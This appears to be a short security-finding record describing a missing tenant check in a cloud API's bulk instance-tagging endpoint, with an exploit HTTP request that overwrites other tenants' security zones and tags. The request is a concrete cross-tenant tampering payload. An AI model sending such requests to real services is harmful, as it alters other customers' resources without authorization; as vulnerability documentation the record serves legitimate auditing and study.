diagnosis: The endpoint executes a bulk update using ormar's ComputeInstance.objects.filter(id__in=...).update(...) without filtering by account_id=current_user.account_id. An attacker can submit instance IDs belonging to other cloud tenants and overwrite their security zones and operational metadata tags.
exploit_request:
POST /compute/instances/bulk-tag HTTP/1.1
Host: cloud.gridcompute.net
Authorization: Bearer <tenant_token>
Content-Type: application/json

{"instance_ids": [1041, 1042, 1045], "security_zone": "quarantined", "tags": {"env": "compromised"}}
